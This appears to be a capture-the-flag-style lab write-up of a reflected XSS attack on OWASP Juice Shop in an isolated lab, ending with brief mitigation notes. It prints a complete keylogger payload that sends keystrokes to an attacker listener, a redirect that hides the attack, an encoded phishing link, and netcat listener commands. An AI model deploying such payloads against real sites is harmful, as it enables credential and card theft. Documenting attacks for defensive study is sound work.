# XSS-Keylogger-Simulation-OWASP-Juice-Shop
## Exploited a Reflected XSS vulnerability to inject a client-side keylogger payload. Implemented an instant JavaScript redirect to mask the attack and successfully exfiltrate simulated credit card information to a Netcat listener.
**DISCLAIMER: For Educational and Defensive Research Purposes Only.**

## Goal of the Attack

The primary objective was to demonstrate a stealthy, multi-stage XSS attack by achieving two concurrent actions:
+ **Stealth Keylogging:** Injecting and activating a background keylogger script.
+ **Masking/Redirection:** Instantly redirecting the victim to a clean application page to conceal the successful injection.

## Lab Environment and Configuration

**All three VirtualBox machines were deployed on an Internal Network, and remained isolated from the host operating system and the internet.**
| Component | Detail | Purpose |
| :--- | :--- | :--- |
| **Vulnerable Application** | OWASP Juice Shop (`192.168.56.12:3000`) | The Reflected XSS vector (Search function) was targeted here. |
| **Attacker Machine (Listener)** | Kali Linux VM (`192.168.56.25`) | Used to host the Netcat listener for data capture. |
| **Victim Machine** | Ubuntu Desktop (`192.168.56.20`) | Used to simulate clicking a phishing link. |

## Execution Flow

1. **Attacker Setup:** The attacker utilizes Reflected XSS to inject JavaScript into the Juice Shop search bar results page. Then established a Netcat listener on the Kali VM (`nc -lnvp 8080`) to await the keylogger.
2. **Victim Clicks Payload:** The victim clicks the malicious link containing the URL-encoded keylogger payload injected into the search parameter. Done through a simulated 'Phishing Email'.
3. **Stealth Redirect:** The **`location='...'`** command executes immediately, overriding the current search result page and redirecting the victim to the legitimate payment methods page.
4. **Data Capture:** The victim, unaware of the background script, enters sensitive information (simulated credit card details) on the new page. The keylogger silently captures every keystroke.
5. **Exfiltration:** After 20 seconds, the **`setTimeout()`** function triggers, forcing the **`fetch`** request to send the full keystroke string **`l`** to the attacker's waiting Netcat listener.

## Attacker Setup

**On the attacking machine:**
+ On the OWASP Juice Shop webpage, the search bar was vulnerable to Reflected XSS. A simple script like `<script>alert(5)</script>` was being blocked by the Content Security Policy (CSP) filter. It was found that the security was ultimately weak, by entering a less common script such as `<img src=x onerror="alert(5)"/>`
+ With the `<img` script being successful, now we can target the search bar, by building a payload that combines the keylogger, timed exfiltration, and the critical redirection command:

      HTML
      
      <img src=x onerror="..." />
  Then the JavaScript inside onerror:

      JavaScript
      
      var l='';document.onkeypress=function(e){l+=e.key;};setTimeout(function(){fetch('http://192.168.56.25:8080/?keys='+l)},20000)
  When entered to the Juice Shop search bar, the page trys to load an invalid image, which triggers the script inside `onerror` and executes. The browser's URL now reflects the injected code:
  
      URL

      http://192.168.56.12:3000/#/search?q=%3Cimg%20src%3Dx%20onerror%3D%22var%20l%3D'';document.onkeypress%3Dfunction(e)%7Bl%2B%3De.key;%7D;setTimeout(function()%7Bfetch('http:%2F%2F192.168.56.25:8080%2F%3Fkeys%3D'%2Bl)%7D,20000)%22

+ After verifying execution, the next step was to make that link stealthy utilizing the `location='...'` command. Adding this command to the JavaScript will automatically redirect the 'victim' to the `saved-payment-methods` page, where users input 'credit card details'.

      JavaScript

      ;location='http://192.168.56.12:3000/#/saved-payment-methods';
  By adding the `location='...'` command to the end of the script, the complete payload will look like:

      HTML

      <img src=x onerror="var l='';document.onkeypress=function(e){l+=e.key;};setTimeout(function(){fetch('http://192.168.56.25:8080/?keys='+l)},20000);location='http://192.168.56.12:3000/#/saved-payment-methods';"/>
  Input the complete payload into the Juice Shop search bar and run. We should now be redirected to the `saved-payment-methods` webpage. If so, the payload was successful and now we must URL-encode the payload.

+ URL-Encoding with python to create the malicious link. From the terminal:

      bash

      python -c "import urllib.parse; print(urllib.parse.quote('''<img src=x onerror=\"var l=\\'\\'; document.onkeypress=function(e){l+=e.key;}; setTimeout(function(){fetch(\\'http://192.168.56.25:8080/?keys=\\' + l)},20000); location=\\'http://192.168.56.12:3000/#/saved-payment-methods\\'\">'''))"

      Output

      %3Cimg%20src%3Dx%20onerror%3D%22var%20l%3D%27%27%3B%20document.onkeypress%3Dfunction%28e%29%7Bl%2B%3De.key%3B%7D%3B%20setTimeout%28function%28%29%7Bfetch%28%27http%3A//192.168.56.25%3A8080/%3Fkeys%3D%27%20%2B%20l%29%7D%2C20000%29%3B%20location%3D%27http%3A//192.168.56.12%3A3000/%23/saved-payment-methods%27%22%3E
  The output will be used for Juice Shop's search URL - `http://192.168.56.12:3000/#/search)` by adding `?q=` to the end, followed by the encoded URL. Complete link should be:

      URL

      http://192.168.56.12:3000/#/search?q=%3Cimg%20src%3Dx%20onerror%3D%22var%20l%3D%27%27%3B%20document.onkeypress%3Dfunction%28e%29%7Bl%2B%3De.key%3B%7D%3B%20setTimeout%28function%28%29%7Bfetch%28%27http%3A//192.168.56.25%3A8080/%3Fkeys%3D%27%20%2B%20l%29%7D%2C20000%29%3B%20location%3D%27http%3A//192.168.56.12%3A3000/%23/saved-payment-methods%27%22%3E

+ Final step, setting Netcat to listen for the keystrokes of the victim:

      bash

      nc -lnvp 8080

## Victim Clicks Payload

**On the victim machine:**
+ From the Ubuntu Desktop, to simulate a real-world phishing attack, we use a email hyperlink (Juice Shop %50 Off Promo!) for the victim to click. The hyperlink helps to hide the long malicious URL, which could alarm the victim.

**To simulate a real phishing email:**

<img width="634" height="378" alt="phishing_email" src="https://github.com/user-attachments/assets/6fd73cea-a934-4738-9d5f-efcd301fc2f0" />

+ Once the victim clicks the link to claim the membership promotion, OWASP Juice Shop's search page loads, then automatically redirects the victim to the `saved-payment-methods` page where they enter their 'credit card details'.

## Stealth Redirect

**Result of the victim clicking the malicious link**
The victim will be completely unaware they were taken to an infected webpage. From the victims perspective, the URL is normal, the webpage is authentic, but it was the result of the `location='...'` command. In the background, the original search page executed the Keylogger, and Netcat started listening.

## Data Capture

**Both attacker and victim machines:**
Now that the victim is on the infected `saved-payment-methods` webpage, they enter their (simulated credit card details) and pays for the 'Deluxe Membership'. Behind the scenes, the victim's keypresses are being logged. 

**The victim enters their credentials:**

<img width="238" height="206" alt="victim_creds" src="https://github.com/user-attachments/assets/e552db2f-f80f-4471-a4eb-03b7aa379104" />

## Exfiltration

**On the attacking machine:**
Netcat will connect to the victim's session and listen to keystrokes for 20 seconds due to the `setTimeout()` command. After 20 seconds, Netcat will capture a GET Request with the victim's keystrokes.

**Netcat captures the keystrokes:**

<img width="513" height="91" alt="stolen_creds" src="https://github.com/user-attachments/assets/e5ea8006-be87-412d-a93c-76fc814f4bf2" />

## Conclusion

This simulation successfully demonstrated a multi-stage Reflected XSS attack by injecting a client-side keylogger payload into the OWASP Juice Shop's search function. The key element was the instant JavaScript redirection, which effectively masked the initial injection 
and allowed the keylogger to run stealthily on a legitimate webpage, proving that XSS can be weaponized beyond simple alerts. This process successfully demonstrated a real-world attack vector, by simulating email phishing for payload delivery.

## Mitigation Notes

1. Content Security Policy (CSP) - the Strongest Defense:

      CSP is a security header that controls where resources can be loaded from. The `connect-src` directive controls API calls like (fetch) for example. Using the CSP policy `connect-src 'self'`, tells the browser only allowed to send data (fetch, etc.) to the origin of this application itself,
  effectively blocking the call to an attacker: `http://192.168.56.25:8080/`

2. Input Validation and Output Encoding

      The search function should validate that the input contains only expected characters. Blocking or stripping characters like `<`, `>`, and `"` would prevent HTML injection. By encoding user-supplied data before rendering it back to the page, the browser will display the data as plain text, effectively neutralizing the payload.



